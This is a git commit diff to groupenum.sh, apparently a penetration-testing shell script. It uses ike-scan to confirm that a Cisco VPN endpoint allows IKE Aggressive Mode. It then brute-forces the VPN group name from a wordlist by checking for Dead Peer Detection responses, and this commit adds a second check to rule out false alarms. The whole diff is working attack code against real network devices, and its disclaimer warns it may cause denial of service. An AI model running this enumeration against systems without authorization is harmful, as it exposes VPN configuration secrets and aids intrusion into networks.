1013f4fc9573f2f48f07dfaaacfa4ecc157c2135
f0cker <dan83turner@yahoo.com>
2013-04-19 12:33:23 +0100

    added additional false alarm checking to groupenum.sh

--- groupenum.sh
+++ groupenum.sh
@@ -1,8 +1,17 @@
 #!/bin/sh
+
+######################################################################################
 #Cisco group name enumeration
 #Requires: ike-scan http://www.nta-monitor.com/tools-resources/security-tools/ike-scan
-#Usage: ./groupenum.sh target  wordlist.txt
-#Disclaimer: I accept no responsibility for any issues caused by running this tool, run at your own risk. i.e. it's not my fault if you cause a DoS condition, modify the sleep time accordingly.
+#Usage: ./groupenum.sh target wordlist.txt
+#Disclaimer: I accept no responsibility for any issues caused by running this tool, 
+#run at your own risk. i.e. it's not my fault if you cause a DoS condition, modify the sleep time accordingly.
+######################################################################################
+
+if [ $# -lt 2 ]; then
+printf "Usage: ./groupenum.sh target  wordlist.txt\n "
+exit 0
+fi
 
 #Determine if device is vulnerable
 echo "[+]Checking if Aggressive Mode is enabled..."
@@ -11,26 +20,28 @@ if ike-scan $1 -M -A --id=admin | grep  -i "aggressive"
  echo "[+]Aggressive mode enabled, checking device is a Cisco endpoint..."
  if ike-scan $1 -M -A --id=admin | grep -i "cisco" 
   then
-  echo "[+] Confirmed Cisco endpoint, checking DPD response..."
-  if ike-scan $1 -M -A --id=thisgroupnamedoesnotexit234585 | grep -i "dead" 
+  echo "[+]Confirmed Cisco endpoint, checking DPD response..."
+  if ike-scan $1 -M -A --id=thisgroupnamedoesnotexit234585 | grep -i "dead peer" 
    then echo "[-]Device does not appear to be vulnerable"
    exit 0
   else
    echo "[+]Device appears to be vulnerable"
    continue
   fi
-
 #Brute force groupname
   echo "[+]Brute forcing group name with:" $2
   while read file
    do
-   if ike-scan $1 -M -A --id=$file | grep -i "dead" && sleep 0.4
-    then echo "[+]Group name =" $file
-    exit 0
+   if ike-scan $1 -M -A --id=$file | grep -i "dead peer" && sleep 0.4
+    then echo "False alarm checking for group" $file
+    if ike-scan $1 -M -A --id=$file | grep -i "dead peer"
+     then echo "[+]Group name =" $file
+     exit 0
+    fi
    fi
    done < $2
   echo  "[+]Trying IP address as group name:" $1
-  if ike-scan $1 -M -A --id=$1 | grep -i "dead"
+  if ike-scan $1 -M -A --id=$1 | grep -i "dead peer"
    then echo "[+]Group name =" $1
    exit 0
   fi
